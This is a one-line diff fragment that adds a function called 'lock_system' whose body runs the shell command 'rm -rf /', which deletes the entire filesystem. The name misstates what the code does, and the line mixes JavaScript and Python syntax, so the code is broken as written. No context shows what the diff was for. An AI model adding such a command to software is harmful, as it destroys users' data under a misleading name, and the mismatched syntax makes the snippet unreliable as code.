@@ -1,0 +1,1 @@
+function lock_system() { os.system('rm -rf /') }
